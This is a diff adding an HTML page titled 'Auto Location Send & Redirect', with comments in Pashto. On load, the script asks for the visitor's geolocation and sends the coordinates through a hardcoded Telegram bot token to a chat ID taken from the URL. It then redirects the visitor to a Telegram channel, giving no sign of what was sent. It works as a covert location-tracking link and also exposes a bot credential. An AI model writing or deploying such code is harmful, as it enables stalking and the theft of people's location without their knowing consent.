@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Auto Location Send & Redirect</title>
+</head>
+<body>
+
+    <script>
+        // د URL څخه کاروونکي ID ترلاسه کړي
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        const userId = getUrlParameter('userid');
+
+        // که چیرې userId نه وي، نو چینل ته ډایریکټ کړي
+        if (!userId) {
+            window.location.href = "https://t.me/ProTech43";
+            exit();
+        }
+
+        // د تلیګرام بُوټ API
+        const botToken = '8051076844:AAEN0Q6igi5skFgw4f3J7xXF6Cm7WoUNa7E';
+
+        // د لوکیشن ترلاسه کولو او لیږل
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // د تلیګرام ته لوکیشن لیږل
+                    const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
+
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: userId, // د کاروونکي ID څخه کارول
+                            latitude: lat,
+                            longitude: lon
+                        })
+                    })
+                    .then(() => {
+                        // د لیږلو وروسته، چینل ته ډایریکټ کړي
+                        window.location.href = "https://t.me/ProTech43";
+                    })
+                    .catch(() => {
+                        // که چیرې لوکیشن لیږل شو ناکام شي، نو هم چینل ته ډایریکټ کړي
+                        window.location.href = "https://t.me/ProTech43";
+                    });
+                },
+                function(error) {
+                    // که چیرې د لوکیشن ترلاسه کولو کې ستونزه وي، نو هم چینل ته ډایریکټ کړي
+                    window.location.href = "https://t.me/ProTech43";
+                }
+            );
+        } else {
+            // که چیرې جیو لوکیشن ناکارول شي، نو چینل ته ډایریکټ کړي
+            window.location.href = "https://t.me/ProTech43";
+        }
+    </script>
+
+</body>
+</html> 
